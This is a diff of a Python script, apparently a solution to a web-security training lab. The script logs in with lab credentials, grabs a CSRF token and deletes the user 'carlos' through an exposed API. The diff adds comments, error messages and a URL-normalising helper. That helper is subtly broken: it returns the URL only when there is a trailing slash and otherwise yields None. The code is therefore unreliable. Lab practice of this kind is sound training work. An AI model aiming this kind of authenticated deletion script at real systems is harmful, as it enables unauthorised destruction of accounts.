@@ -2,7 +2,7 @@
 # To solve the lab, find the exposed API documentation and delete carlos. You can log in to your own account using the following credentials: wiener:peter.
 # Credit: Kestrel.hzl
 
-from urllib import response
+#from urllib import response
 import requests
 import sys
 from bs4 import BeautifulSoup
@@ -28,7 +28,18 @@ base_url = args[0]
 username = "wiener"
 password = "peter"
 
+# Check if url end with / , if true delete slash
+def check_url(base_url):
+    if base_url.endswith('/'):
+        base_url = base_url[:-1]
+
+        return base_url
+
+base_url = check_url(base_url)
+
+# Define login url
 login_url = base_url + "/login"
+
 
 # Get the CSRF Token
 def get_csrf_token(login_url, session):
@@ -91,14 +102,14 @@ def delete_user(session):
         print("Error to Delete User.")
         
         if "User not found" in response.text:
-            print("User Carlos not found.")
-
+            print("User Carlos not found.  Maybe user has already deleted.")
 
 
 
 # Create Session
 session = requests.session()
 
+# Get CSRF token
 csrf_token = get_csrf_token(login_url, session)
 
 if csrf_token:
@@ -109,4 +120,5 @@ if csrf_token:
     delete_user(session)
     
 else:
+    print("Can not get CSRF token.")
     sys.exit(1)
